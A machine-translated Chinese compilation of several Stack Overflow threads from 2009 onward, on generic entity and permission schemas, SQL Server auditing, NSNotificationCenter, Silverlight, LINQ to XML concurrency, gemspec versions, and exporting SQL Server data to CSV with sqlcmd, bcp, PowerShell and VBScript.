提议的系统让所有主要实体（用户、公司、CBO）在一个名为 Entity 的新表中引用一个值。（在代码中，我们可能会将所有这些实体作为 Entity 超类的子类）。然后有两个额外的表引用了Entity * Group，它也是一个Entity“子类”。* EntityRelation，它是任意类型（包括 Group）的两个实体之间的关系。这可能还会有某种“关系类型”字段来解释/限定关系。

这个系统，至少乍一看，看起来可以满足我们的很多要求。我们可能会在未来引入新的实体，但我们永远不需要额外的表来处理这些实体之间的分组和关系，因为 Group 和 EntityRelation 已经可以处理这些了。

但是，我担心这在实践中是否可能效果不佳。实体之间的关系将变得非常复杂，并且人们（用户和开发人员等）可能很难理解它们。而且，它们会非常递归；这将使我们依赖 SQL 的报告编写人员的工作变得更加困难。

有没有人有类似系统的经验？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-08T19:07:11.700

我对此有一个奇怪的经历；如下：

架构师/程序员设计了非常对称的通用模型，看起来非常整洁，非常树状和递归。

当涉及到用户界面设计时，*客户*或*用户*坚持认为实际使用要简单得多，并且会对这两个简单的屏幕感到满意（用户/客户在您聆听时将它们绘制在黑板上）。

在这个阶段，我一直发现当底层模型支持没有人真正想要或需要的非常通用的用例时，*解决方案往往会变得非常臃肿。*所以我的基本建议是始终非常密切地倾听客户的意见，并非常接近真正的需求。确保您对整洁结构的个人需求不是这里的驱动力。

是的，我经历过很多次：在我最近的经历中，所有的开发人员都非常肯定我们在谈论的是层次树结构。但客户绝对希望这是在所有方面都是扁平的列表式结构。在我们陷入困境之前，我们必须绕一圈（先实现树，然后是列表）。

我不完全确定您建议的通用模型，但它具有让我开始谈论过度通用模型的所有*气味。*在选择之前，我至少*会*非常肯定地**对这两种**选择进行详细建模。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-08T19:13:22.687

您正在对现实世界中的一组业务规则进行建模，这些规则本身就很复杂。因此，无论您如何操作，您的模型都会变得复杂也就不足为奇了。

我建议您选择更准确地描述关系的数据库设计，而不是试图变得聪明。您的巧妙设计可能会导致更少的表（尽管实际上不是一个数量级），但是您要权衡的是要管理它的应用程序代码要多得多。

例如，您已经知道它会给用户和报表设计者带来困惑。另一个弱点是确保“关系类型”列只包含对关系中涉及的实体有意义的字符串。例如说有道理`Bob IsMemberOf UserGroup4`，但如果是什么意思`CBO CanViewReportsOf Bob`？另外，您如何防止相互排斥的条件，例如`Bob IsMemberOf Company1`and `Bob IsMemberOf Company2`？

您必须在插入数据之前和获取数据之后编写应用程序代码来验证数据（因为您的代码永远无法确定代码的另一部分没有引入数据完整性错误）。您可能还需要编写应用程序代码来对整个数据库执行质量控制检查，并在出现异常时清理它们。

*与无法*输入无效关系的数据库设计相比，因为数据库元数据包含阻止它的约束。这将大大简化您的应用程序代码。

您还确定了分层访问权限，例如 if `Bob CanViewReportsOf Company1`，那么他是否应该能够查看属于该公司成员的任何 UserGroup 或 CBO 的报告？或者您是否需要为 Bob 可以阅读的每个实体的报告输入单独的行？这些是政策问题，无论您使用哪种设计，都将存在。

* * *

要回复您的评论：

我当然可以理解拜占庭式的例外情况和不断变化的需求，这使得设计简单的解决方案变得困难。

我从事的系统试图模拟现实世界的政策，这些政策变得如此复杂，以至于试图将它们编入软件似乎是愚蠢的。最终，雇用我的客户会更有效地利用他们的钱聘请一两个全职行政助理来使用纸和铅笔跟踪他们的项目。我花了数周时间在软件中实施的新异常案例可能需要几分钟才能向 AA 描述。

自动化比手动操作更难。自动化合理的唯一方法是，如果需要比人类更快或更大数量地跟踪信息。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-08T23:15:12.463

您的实体/关系提案是如此“元”，以至于它足够灵活以处理所有疯狂的排列 - 哎呀，您离一个表只有一步之遥，该表只有一个列，其中包含实现其逻辑的类的路径，在那里做过 - 但正如你指出的那样直接管理它会导致疯狂的混乱。您需要从业务对象层（re：单表继承？）在其上放​​置一个漂亮漂亮的包装器以隐藏所有抽象。但在您遇到所有这些麻烦之前，请查看其他已经建立的系统。大多数时候，我发现自己掉进了这个兔子洞，最终实现了[Unix 文件系统权限](http://en.wikipedia.org/wiki/File_system_permissions)，不出所料，它经受住了时间的考验。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-08T23:50:33.030

在之前的工作中，我们走上了类似的道路，最终有效地为数据实体实现了活动目录类型的权限。

每个需要权限的表都有一个指向 SecurityObject 表的外键。UserPermission 和 GroupPermission 表中的行表示不同用户对该 SecurityObject 行的权限类型。SecurityObject 表中的数据是分层的——默认情况下，每一行都从其父级继承权限（如果有的话）。

相应的数据实体类实现了一个通用接口，因此安全 api 可以处理任何“安全”数据，而无需确切知道它是什么。

用于控制组和用户权限的 UI 组件提供了一个用于管理实体权限的通用界面。

这用于设置内部数据库驱动的 CMS 的权限，用于构建许多网站供合作伙伴公司在内部和外部使用，以及其他类型的数据，例如访问客户记录。

我们在构建它时遇到的主要问题之一是尽量减少数据库命中的数量。这是有问题的，因为 SecurityObject 和 Group 表中的分层数据使高效查询变得困难——当您对大量数据实体进行权限检查时，这是一个大问题。

如果您的应用程序分布在多台机器上，这会导致大量的数据缓存和它自己的一系列问题。

由于这一切，我倾向于同意其他一些海报，您需要**非常**确定这是业务需要的，否则您可能会发现您正在以一种痛苦的方式浪费您的时间。

如果我再次这样做，我一定会使用存储过程来检查和管理安全对象和权限 - 坚持使用 ORM 实体很可能使我的工作变得更加困难：]

# sql-server - MS SQL 审计

> ID：425353
> 
> 赞同：0
> 
> 时间：2009-01-08T18:40:24.000
> 
> 标签：sql-server, stored-procedures, auditing

我在工作中遇到了数据库问题。目前有审计，但它笨重，需要大量维护，并且在某些方面存在不足。所以我正在更换它。

我想以尽可能通用的方式做到这一点，并设计了表格，以及所有内容将如何链接和更新。

现在，这一切都很好，但是我希望能够编写一种通用的方法来将记录插入这些审计表中。（无需为要更改的每个表中的每一列输入命令。）

存储过程中是否有遍历表中所有列的方法？我想以这样的方式编写它，它可以与多个表一起使用，并自动拾取和审计添加的列等。

有任何想法吗？

编辑：我想我应该澄清一下。我将审核表中的数据。但我将使用相同的表来存储数据库中每个表的审计数据。

而且我不能使用触发器，因为通常，当更新发生时，它会发生在多个表中，但我希望所有这些更新都成为单个变更集的一部分。

这不是问题，因为我可以在单个存储过程中完成所有更新。我更喜欢循环之类的方式，我可以获取所有更新的字段，找出哪些已更改，并将这些更改的字段插入审计表中。

而且我想在没有长长的 if 语句列表和每列的 insert 语句的情况下做到这一点。（通过在通用循环中执行此操作，它将自动处理添加的列，而不会被删除的列打扰）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-08T18:51:11.543

通过“添加列”，我猜您正在寻找审核 DDL。如果您使用 SQL 2005，那么您需要[此链接](http://www.sqlteam.com/article/using-ddl-triggers-in-sql-server-2005-to-capture-schema-changes)。

如果不使用 SQL 2005，那么您可能想要使用众多 SQL 模式比较工具之一，例如 SQL Red Gates 工具集，其中可能有一些东西。

如果您没有用于工具的 $，那么您可能只想对 information_schema.tables 和 information_schema.columns 运行定期查询。通过在永久表中定期捕获这些，您可以确定它们何时获得或丢失行（因此发生架构更改）

**如果您改为进行数据审计**，那么您需要编写代码生成一些触发器，再次使用 information_schema.tables 和 information_schema.columns。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-08T18:44:46.767

会有性能考虑，但您可以将插入和更新触发器添加到所有表中，并将触发器插入到您的审计表中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T19:34:33.627

如果您愿意，只需升级到 sql server 2008 并打开 Change Data Capture。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T18:53:03.617

使用 DDL 触发器（假设您有 SQL Server 2005+）！

[http://www.sqlteam.com/article/using-ddl-triggers-in-sql-server-2005-to-capture-schema-changes](http://www.sqlteam.com/article/using-ddl-triggers-in-sql-server-2005-to-capture-schema-changes)

[http://technet.microsoft.com/en-us/library/ms189871.aspx](http://technet.microsoft.com/en-us/library/ms189871.aspx)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-08T18:54:07.450

如果您使用的数据访问层可以捕获正在更新的表和列并为审计表生成插入语句，则可以这样做。在存储过程中？哪个存储过程？你有一个可以更新的吗？还是您要为每张桌子创建一个？

# cocoa - NSNotificationCenter 为“观察者”和“对象”保留什么类型的参考？

> ID：425354
> 
> 赞同：19
> 
> 时间：2009-01-08T18:40:28.290
> 
> 标签：cocoa, cocoa-touch

任何人都可以澄清/阐明有关情况`-[NSNotificationCenter addObserver:selector:name:object:]`吗？

*   'observer' 和 'object' 参数的通知中心保留了哪些类型的引用？

*   从通知中心移除观察者的最佳实践是什么？

*   多线程应用程序有哪些特别关注点，尤其是关于“对象”参数？

*   此方法在 GC 和非 GC 环境中的行为有何不同？

*   这种方法的行为在移动和桌面环境之间是否有任何显着差异（从客户端的角度来看）？

此外，任何指向涵盖此内容的现有文章的指针将不胜感激。我用谷歌搜索，但惊讶地发现对这些问题*的深入*讨论很少（尽管也许我没有使用正确的魔法关键字）。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2009-01-08T19:16:37.797

> 'observer' 和 'object' 参数的通知中心保留了哪些类型的引用？

我相信一个弱引用，尽管这只是来自记忆（不是双关语）。

> 从通知中心删除观察者的最佳做法是什么？

始终在释放之前从通知中心删除已注册的对象。对象的 dealloc 方法是一个很好的地方，如果它设置了注册本身，或者当你释放它时另一个对象正在管理通知订阅。记住这一点，上述内容无关紧要。

> 多线程应用程序有什么特别关注的问题，尤其是 WRT 的“对象”参数？

NSNotificationCenter 在线程上工作正常，**但**如果你从后台线程发送通知，对象将在同一个线程上接收它。由于这种行为，如果您正在更新 UI 或执行其他任何非线程安全的操作（或者，从主线程上的另一个方法分派通知），您应该使用不同的方法。

> 这种方法在 GC 和非 GC 环境中的行为有何不同？

我不记得听说过您需要担心的任何事情，尽管我还没有过多地使用 GC。

> 这种方法的行为在移动环境和桌面环境之间是否有任何显着差异（从客户端的角度来看）？

不是我听说过的，不。注册对象时，您可以选择注册所有通知或仅注册来自某个对象的通知。如果您大量使用通知，后者可能会更快一些，但请务必进行测试以确保。

> 此外，任何指向涵盖此内容的现有文章的指针将不胜感激。我用谷歌搜索，但惊讶地发现对这些问题的深入讨论很少（尽管也许我没有使用正确的魔法关键字）。

我认为这更多是因为 NSNotificationCenter 通常非常易于使用。如果您担心某些情况，请不要害怕编写快速测试应用程序！

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2016-05-05T05:53:12.043

2016年现状：

[iOS 9 已更改](https://developer.apple.com/library/mac/releasenotes/Foundation/RN-Foundation/index.html#10_11NotificationCenter) `NSNotificationCenter`为**弱引用**目标对象。

这也意味着您不再需要`removeObserver`在对象被释放时。

# .net - silverlight：显示/隐藏用户控件

> ID：425357
> 
> 赞同：1
> 
> 时间：2009-01-08T18:41:05.043
> 
> 标签：.net, silverlight, silverlight-2.0

我的silverlight 应用程序会引导用户完成一种类似向导的过程，因此对于向导中的每个屏幕，我都创建了一个单独的用户控件。然后在我的主用户控件（应用程序 RootVisual）中，我只在需要时显示/隐藏每个用户控件。这意味着每个用户控件都被一次实例化，是否可以一次只加载一个使用控件并显示？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-08T18:48:09.273

Jesse Liberty 有一些关于多页 Silverlight 应用程序的不错的教程：

[教程](http://silverlight.net/learn/tutorials/MultiPageApps_cs.aspx) 和 [更新](http://jesseliberty.com/2008/11/21/a-better-multi-page-solution/)

# linq - LINQ to XML 更新 - 它如何处理多个并发读取器/写入器？

> ID：425362
> 
> 赞同：0
> 
> 时间：2009-01-08T18:42:03.187
> 
> 标签：linq, concurrency, linq-to-xml, updates

我有一个使用 XML 进行数据存储的旧系统。我打算将数据用于另一个小型项目，并希望使用 LINQ to XML 来查询/更新数据；但是有两种情况我不确定我是否需要自己处理：

1-如果我有类似于以下代码的内容，并且有 2 个人碰巧同时点击了 Save()？LINQ to XML 是等到文件再次可用后再保存，还是会抛出？除非需要，否则我不想放锁:)

```
// I assume the next line doesn't lock the file
XElement doc = XElement.Load("Books.xml");
XElement newBook = new XElement("Book",
new XAttribute("publisher", "My Publisher"),
new XElement("author", "Me")));
doc.Add(newBook);

// What happens if two people try this at the same time?
doc.Save("Books.xml"); 
```

2-如果我加载（）一个文档，在特定节点下添加一个条目，然后点击保存（）；如果另一个用户已经在该节点下添加了一个值（因为我点击了我的 Load()），或者更糟糕的是，删除了该节点，会发生什么？

显然我可以解决这些问题，但是我找不到任何可以告诉我是否必须这样做的文档，而且第一个文档至少对于可靠地测试来说有点麻烦。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-08T19:49:30.570

这不是真正的 LINQ to XML 问题，而是基本的并发问题。

1.  假设两个人同时点击保存，并且后备存储是一个文件，那么根据您打开文件进行保存的方式，您可能会收到错误消息。如果您将它留给 XDocument 类（仅通过传入一个文件名），那么它很可能会以独占方式打开它，而其他人试图做同样的事情（假设相同的代码命中它）将得到一个异常。您基本上必须同步对您正在读取/写入的任何共享资源的访问。

2.  如果另一个用户已经添加了一个值，那么假设您在获取要写入的资源时没有问题，您的更改将覆盖该资源。这是被称为乐观并发的数据库的常见问题，您需要某种值来指示在加载数据和保存数据之间是否发生了更改（大多数数据库会为您生成时间戳值）。

# ruby - 在文档/库/脚本中使用 .gemspec 版本

> ID：425372
> 
> 赞同：0
> 
> 时间：2009-01-08T18:44:25.037
> 
> 标签：ruby, rubygems, gem, rdoc

所以，我最近一直在写一堆 ruby​​ gem，我觉得方便的一件事是在`rdoc`我的库的 -generated 文档和`OptionParser`-generated`--help`使用的部分中包含当前版本（如 gemspec 中指定）通过我的脚本（我通过 gem 分发）。无论如何，我都可以让我的用户轻松找出他们当前正在使用的库/脚本版本。

`lib/`有什么方法可以从我的or目录中的 ruby​​ 文件访问我在 gemspec 中指定的版本`bin/`？这样，我不必一次在多个地方更新它 - 只需在我的 gemspec 中。

目前我手动生成我的 gemspecs，我还没有跳上 Rake 火车。如果我不能只用 ruby​​gems 给我的东西直接做我想做的事，rake 或其他工具会允许我这样做吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-30T00:46:18.897

我认为没有办法，因为 Rubygems 只是 Ruby 库的一种安装机制，没有预定义的版本控制概念。

但是，可能的解决方法可能包括使用`Gem.loaded_specs`来查找已加载的 gem：

```
Gem.loaded_specs["mygemname"].version.to_s #=> "1.2.3" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-09T09:11:35.520

您可能想看看[newgem](http://rubyforge.org/forum/forum.php?forum_id=28119) gem - 因为它既会生成适当的目录布局，也会生成 gemspec 文件（与 GitHub 兼容）。

# sql-server - 如何使用 sqlcmd 从 SQL Server 将数据导出为 CSV 格式？

> ID：425379
> 
> 赞同：153
> 
> 时间：2009-01-08T18:49:09.613
> 
> 标签：sql-server, file, csv, sqlcmd

我可以很容易地将数据转储到文本文件中，例如：

```
sqlcmd -S myServer -d myDB -E -Q "select col1, col2, col3 from SomeTable" 
     -o "MyData.txt" 
```

但是，我查看了帮助文件，`SQLCMD`但没有看到专门针对 CSV 的选项。

有没有办法将表中的数据转储到 CSV 文本文件中`SQLCMD`？

* * *

## 回答 #1

> 赞同：154
> 
> 时间：2009-01-08T19:08:34.753

你可以运行这样的东西：

```
sqlcmd -S MyServer -d myDB -E -Q "select col1, col2, col3 from SomeTable" 
       -o "MyData.csv" -h-1 -s"," -w 700 
```

*   `-h-1`从结果中删除列名标题

*   `-s","`将列分隔符设置为 ,

*   `-w 700`将行宽设置为 700 个字符（这需要与最长行一样宽，否则它将换行到下一行）

* * *

## 回答 #2

> 赞同：94
> 
> 时间：2014-06-01T02:21:34.883

使用 PowerShell，您可以通过管道 Invoke-Sqlcmd 到 Export-Csv 巧妙地解决问题。

```
#Requires -Module SqlServer
Invoke-Sqlcmd -Query "SELECT * FROM DimDate;" `
              -Database AdventureWorksDW2012 `
              -Server localhost |
Export-Csv -NoTypeInformation `
           -Path "DimDate.csv" `
           -Encoding UTF8 
```

SQL Server 2016 包含**SqlServer**模块，该模块包含`Invoke-Sqlcmd`cmdlet，即使您只安装 SSMS 2016，您也将拥有该模块。在此之前，SQL Server 2012 包含旧的[**SQLPS**模块](http://msdn.microsoft.com/en-us/library/hh231286.aspx)，该模块会将当前目录更改为`SQLSERVER:\`模块安装时的目录。首次使用（以及其他错误）因此，您需要将`#Requires`上面的行更改为：

```
Push-Location $PWD
Import-Module -Name SQLPS
# dummy query to catch initial surprise directory change
Invoke-Sqlcmd -Query "SELECT 1" `
              -Database  AdventureWorksDW2012 `
              -Server localhost |Out-Null
Pop-Location
# actual Invoke-Sqlcmd |Export-Csv pipeline 
```

要修改 SQL Server 2008 和 2008 R2 的示例，请`#Requires`完全删除该行并使用[sqlps.exe 实用程序](https://msdn.microsoft.com/en-us/library/cc280450.aspx)而不是标准 PowerShell 主机。

[Invoke-Sqlcmd](http://msdn.microsoft.com/en-us/library/cc281720.aspx)是 sqlcmd.exe 的 PowerShell 等效项。[它输出System.Data.DataRow](http://msdn.microsoft.com/en-us/library/system.data.datarow.aspx)对象而不是文本。

该`-Query`参数的作用类似于`-Q`sqlcmd.exe 的参数。向它传递一个描述您要导出的数据的 SQL 查询。

该`-Database`参数的作用类似于`-d`sqlcmd.exe 的参数。将包含要导出的数据的数据库的名称传递给它。

该`-Server`参数的作用类似于`-S`sqlcmd.exe 的参数。将包含要导出的数据的服务器的名称传递给它。

[Export-CSV](http://technet.microsoft.com/en-us/library/hh849932.aspx)是将通用对象序列化为 CSV 的 PowerShell cmdlet。它随 PowerShell 一起提供。

该`-NoTypeInformation`参数抑制不属于 CSV 格式的额外输出。默认情况下，cmdlet 会写入带有类型信息的标头。当您稍后使用 反序列化对象时，它可以让您知道对象的类型`Import-Csv`，但它会混淆需要标准 CSV 的工具。

该`-Path`参数的作用类似于`-o`sqlcmd.exe 的参数。如果您无法使用旧的**SQLPS**模块，则此值的完整路径是最安全的。

该`-Encoding`参数的作用类似于 sqlcmd.exe 的`-f`or`-u`参数。默认情况下，Export-Csv 仅输出 ASCII 字符并用问号替换所有其他字符。改用 UTF8 来保留所有字符并与大多数其他工具保持兼容。

与 sqlcmd.exe 或 bcp.exe 相比，此解决方案的主要优点是您不必破解命令即可输出有效的 CSV。Export-Csv cmdlet 为您处理这一切。

主要缺点是`Invoke-Sqlcmd`在沿管道传递之前读取整个结果集。确保您有足够的内存用于要导出的整个结果集。

对于数十亿行，它可能无法顺利运行。如果这是一个问题，您可以尝试其他工具，或者推出您自己的`Invoke-Sqlcmd`使用 [System.Data.SqlClient.SqlDataReader](http://msdn.microsoft.com/en-gb/library/system.data.sqlclient.sqldatareader.aspx)类的高效版本。

* * *

## 回答 #3

> 赞同：76
> 
> 时间：2010-03-11T16:42:29.987

```
sqlcmd -S myServer -d myDB -E -o "MyData.txt" ^
    -Q "select bar from foo" ^
    -W -w 999 -s"," 
```

最后一行包含特定于 CSV 的选项。

*   `-W`   从每个单独的字段中删除尾随空格
*   `-s","`   将列分隔符设置为逗号 (,)
*   `-w 999`   将行宽设置为 999 个字符

[scottm 的答案](https://stackoverflow.com/questions/425379/how-to-export-data-as-csv-format-from-sql-server-using-sqlcmd/425463#425463)与我使用的非常接近，但我发现这`-W`是一个非常好的补充：当我在其他地方使用 CSV 时，我不需要修剪空格。

另请参阅[MSDN sqlcmd 参考](http://msdn.microsoft.com/en-us/library/ms162773.aspx)。它使`/?`选项的输出相形见绌。

* * *

## 回答 #4

> 赞同：63
> 
> 时间：2011-03-25T05:19:20.720

这不是`bcp`为了吗？

```
bcp "select col1, col2, col3 from database.schema.SomeTable" queryout  "c:\MyData.txt"  -c -t"," -r"\n" -S ServerName -T 
```

从命令行运行它以检查语法。

```
bcp /? 
```

例如：

```
usage: bcp {dbtable | query} {in | out | queryout | format} datafile
  [-m maxerrors]            [-f formatfile]          [-e errfile]
  [-F firstrow]             [-L lastrow]             [-b batchsize]
  [-n native type]          [-c character type]      [-w wide character type]
  [-N keep non-text native] [-V file format version] [-q quoted identifier]
  [-C code page specifier]  [-t field terminator]    [-r row terminator]
  [-i inputfile]            [-o outfile]             [-a packetsize]
  [-S server name]          [-U username]            [-P password]
  [-T trusted connection]   [-v version]             [-R regional enable]
  [-k keep null values]     [-E keep identity values]
  [-h "load hints"]         [-x generate xml format file]
  [-d database name] 
```

请注意，`bcp`不能输出列标题。

请参阅：[bcp 实用程序](https://docs.microsoft.com/en-us/sql/tools/bcp-utility)文档页面。

上一页的示例：

```
bcp.exe MyTable out "D:\data.csv" -T -c -C 65001 -t , ... 
```

* * *

## 回答 #5

> 赞同：12
> 
> 时间：2011-08-31T16:04:43.597

任何想要这样做但也有列标题的人的注释，这是我使用批处理文件的解决方案：

```
sqlcmd -S servername -U username -P password -d database -Q "set nocount on; set ansi_warnings off; sql query here;" -o output.tmp -s "," -W
type output.tmp | findstr /V \-\,\- > output.csv
del output.tmp 
```

这会将初始结果（包括标题和数据之间的 ----,---- 分隔符）输出到一个临时文件中，然后通过 findstr 将其过滤掉来删除该行。请注意，它并不完美，因为它会过滤掉`-,-`——如果输出中只有一列，它就不起作用，它还会过滤掉包含该字符串的合法行。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2016-11-16T05:04:45.910

BCP 的替代选项：

```
exec master..xp_cmdshell 'BCP "sp_who" QUERYOUT C:\av\sp_who.txt -S MC0XENTC -T -c ' 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2017-06-27T21:05:21.720

这个答案建立在@iain-elder 的解决方案之上，除了大型数据库案例（如他的解决方案中所指出的那样）外，该解决方案运行良好。整个表需要适合您系统的内存，对我来说这不是一个选择。我怀疑最好的解决方案是使用[System.Data.SqlClient.SqlDataReader](http://msdn.microsoft.com/en-gb/library/system.data.sqlclient.sqldatareader.aspx)和自定义 CSV 序列化程序（[参见此处的示例](https://stackoverflow.com/a/44016589/134930))）或其他具有 MS SQL 驱动程序和 CSV 序列化的语言。本着可能正在寻找无依赖解决方案的原始问题的精神，下面的 PowerShell 代码对我有用。它非常缓慢且效率低下，尤其是在实例化 $data 数组并以附加模式为每个 $chunk_size 行调用 Export-Csv 时。

```
$chunk_size = 10000
$command = New-Object System.Data.SqlClient.SqlCommand
$command.CommandText = "SELECT * FROM <TABLENAME>"
$command.Connection = $connection
$connection.open()
$reader = $command.ExecuteReader()

$read = $TRUE
while($read){
    $counter=0
    $DataTable = New-Object System.Data.DataTable
    $first=$TRUE;
    try {
        while($read = $reader.Read()){

            $count = $reader.FieldCount
            if ($first){
                for($i=0; $i -lt $count; $i++){
                    $col = New-Object System.Data.DataColumn $reader.GetName($i)
                    $DataTable.Columns.Add($col)
                }
                $first=$FALSE;
            }

            # Better way to do this?
            $data=@()
            $emptyObj = New-Object System.Object
            for($i=1; $i -le $count; $i++){
                $data +=  $emptyObj
            }

            $reader.GetValues($data) | out-null
            $DataRow = $DataTable.NewRow()
            $DataRow.ItemArray = $data
            $DataTable.Rows.Add($DataRow)
            $counter += 1
            if ($counter -eq $chunk_size){
                break
            }
        }
        $DataTable | Export-Csv "output.csv" -NoTypeInformation -Append
    }catch{
        $ErrorMessage = $_.Exception.Message
        Write-Output $ErrorMessage
        $read=$FALSE
        $connection.Close()
        exit
    }
}
$connection.close() 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2018-02-25T19:16:25.110

通常`sqlcmd`附带[`bcp`实用程序](https://docs.microsoft.com/en-us/sql/tools/bcp-utility)（作为 的一部分`mssql-tools`），默认情况下会导出为 CSV。

用法：

```
bcp {dbtable | query} {in | out | queryout | format} datafile 
```

例如：

```
bcp.exe MyTable out data.csv 
```

* * *

要将所有表转储到相应的 CSV 文件中，请使用*Bash*脚本：

```
#!/usr/bin/env bash
# Script to dump all tables from SQL Server into CSV files via bcp.
# @file: bcp-dump.sh
server="sql.example.com" # Change this.
user="USER" # Change this.
pass="PASS" # Change this.
dbname="DBNAME" # Change this.
creds="-S '$server' -U '$user' -P '$pass' -d '$dbname'"
sqlcmd $creds -Q 'SELECT * FROM sysobjects sobjects' > objects.lst
sqlcmd $creds -Q 'SELECT * FROM information_schema.routines' > routines.lst
sqlcmd $creds -Q 'sp_tables' | tail -n +3 | head -n -2 > sp_tables.lst
sqlcmd $creds -Q 'SELECT name FROM sysobjects sobjects WHERE xtype = "U"' | tail -n +3 | head -n -2 > tables.lst

for table in $(<tables.lst); do
  sqlcmd $creds -Q "exec sp_columns $table" > $table.desc && \
  bcp $table out $table.csv -S $server -U $user -P $pass -d $dbname -c
done 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2018-03-29T22:29:25.990

上面的答案几乎为我解决了它，但它没有正确创建解析的 CSV。

这是我的版本：

```
sqlcmd -S myurl.com -d MyAzureDB -E -s, -W -i mytsql.sql | findstr /V /C:"-" /B > parsed_correctly.csv 
```

有人说`sqlcmd`支持某些 PowerShell 替代方案已过时，是忘记了这`sqlcmd`不仅适用于 Windows。我在 Linux 上（而在 Windows 上我还是避免使用 PS）。

说了这么多，我确实发现`bcp`更容易了。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2018-12-20T12:30:58.777

由于以下两个原因，您应该在 CMD 中运行我的解决方案：

1.  查询中可能有双引号
2.  有时需要登录用户名和密码才能查询远程 SQL Server 实例

    ```
    sqlcmd -U [your_User]  -P[your_password] -S [your_remote_Server] -d [your_databasename]  -i "query.txt" -o "output.csv" -s"," -w 700 
    ```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2022-02-17T23:22:46.887

尝试使用 python 包`sqlcmd-csv`将逗号分隔的输出后处理为有效的 csv。

[https://github.com/shadiakiki1986/sqlcmd-csv](https://github.com/shadiakiki1986/sqlcmd-csv)

```
sqlcmd ... -s, ...
pip install git+https://github.com/shadiakiki1986/sqlcmd-csv.git
sqlcmd_csv out.txt out.csv 
```

* * *

## 回答 #12

> 赞同：-1
> 
> 时间：2009-01-08T18:50:56.833

你可以用一种骇人听闻的方式来做到这一点。小心使用`sqlcmd`黑客。如果数据有双引号或逗号，你会遇到麻烦。

您可以使用一个简单的脚本来正确执行此操作：

```
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Data Exporter                                                 '
'                                                               '
' Description: Allows the output of data to CSV file from a SQL '
'       statement to either Oracle, SQL Server, or MySQL        '
' Author: C. Peter Chen, http://dev-notes.com                   '
' Version Tracker:                                              '
'       1.0   20080414 Original version                         '
'   1.1   20080807 Added email functionality                '
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
option explicit
dim dbType, dbHost, dbName, dbUser, dbPass, outputFile, email, subj, body, smtp, smtpPort, sqlstr

'''''''''''''''''
' Configuration '
'''''''''''''''''
dbType = "oracle"                 ' Valid values: "oracle", "sqlserver", "mysql"
dbHost = "dbhost"                 ' Hostname of the database server
dbName = "dbname"                 ' Name of the database/SID
dbUser = "username"               ' Name of the user
dbPass = "password"               ' Password of the above-named user
outputFile = "c:\output.csv"      ' Path and file name of the output CSV file
email = "email@me.here"           ' Enter email here should you wish to email the CSV file (as attachment); if no email, leave it as empty string ""
  subj = "Email Subject"          ' The subject of your email; required only if you send the CSV over email
  body = "Put a message here!"    ' The body of your email; required only if you send the CSV over email
  smtp = "mail.server.com"        ' Name of your SMTP server; required only if you send the CSV over email
  smtpPort = 25                   ' SMTP port used by your server, usually 25; required only if you send the CSV over email
sqlStr = "select user from dual"  ' SQL statement you wish to execute
'''''''''''''''''''''
' End Configuration '
'''''''''''''''''''''

dim fso, conn

'Create filesystem object 
set fso = CreateObject("Scripting.FileSystemObject")

'Database connection info
set Conn = CreateObject("ADODB.connection")
Conn.ConnectionTimeout = 30
Conn.CommandTimeout = 30
if dbType = "oracle" then
    conn.open("Provider=MSDAORA.1;User ID=" & dbUser & ";Password=" & dbPass & ";Data Source=" & dbName & ";Persist Security Info=False")
elseif dbType = "sqlserver" then
    conn.open("Driver={SQL Server};Server=" & dbHost & ";Database=" & dbName & ";Uid=" & dbUser & ";Pwd=" & dbPass & ";")
elseif dbType = "mysql" then
    conn.open("DRIVER={MySQL ODBC 3.51 Driver}; SERVER=" & dbHost & ";PORT=3306;DATABASE=" & dbName & "; UID=" & dbUser & "; PASSWORD=" & dbPass & "; OPTION=3")
end if

' Subprocedure to generate data.  Two parameters:
'   1\. fPath=where to create the file
'   2\. sqlstr=the database query
sub MakeDataFile(fPath, sqlstr)
    dim a, showList, intcount
    set a = fso.createtextfile(fPath)

    set showList = conn.execute(sqlstr)
    for intcount = 0 to showList.fields.count -1
        if intcount <> showList.fields.count-1 then
            a.write """" & showList.fields(intcount).name & ""","
        else
            a.write """" & showList.fields(intcount).name & """"
        end if
    next
    a.writeline ""

    do while not showList.eof
        for intcount = 0 to showList.fields.count - 1
            if intcount <> showList.fields.count - 1 then
                a.write """" & showList.fields(intcount).value & ""","
            else
                a.write """" & showList.fields(intcount).value & """"
            end if
        next
        a.writeline ""
        showList.movenext
    loop
    showList.close
    set showList = nothing

    set a = nothing
end sub

' Call the subprocedure
call MakeDataFile(outputFile,sqlstr)

' Close
set fso = nothing
conn.close
set conn = nothing

if email <> "" then
    dim objMessage
    Set objMessage = CreateObject("CDO.Message")
    objMessage.Subject = "Test Email from vbs"
    objMessage.From = email
    objMessage.To = email
    objMessage.TextBody = "Please see attached file."
    objMessage.AddAttachment outputFile

    objMessage.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
    objMessage.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserver") = smtp
    objMessage.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = smtpPort

objMessage.Configuration.Fields.Update

    objMessage.Send
end if

'You're all done!!  Enjoy the file created.
msgbox("Data Writer Done!") 
```

